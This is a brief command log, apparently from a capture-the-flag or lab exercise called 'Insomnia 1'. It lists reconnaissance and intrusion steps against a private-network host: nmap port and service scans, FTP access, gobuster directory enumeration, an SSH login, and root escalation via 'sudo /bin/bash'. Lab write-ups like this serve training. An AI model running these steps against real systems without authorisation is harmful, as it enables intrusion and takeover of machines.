# Command Log – Insomnia 1

## Network Scan
nmap -p- 192.168.1.20

## Service Scan
nmap -sV -sC -p21,22,80 192.168.1.20

## FTP Access
ftp 192.168.1.20

## Directory Enumeration
gobuster dir -u http://192.168.1.20 -w /usr/share/wordlists/dirb/common.txt

## SSH Login
ssh user@192.168.1.20

## Privilege Escalation
sudo -l
sudo /bin/bash

## Root Verification
whoami
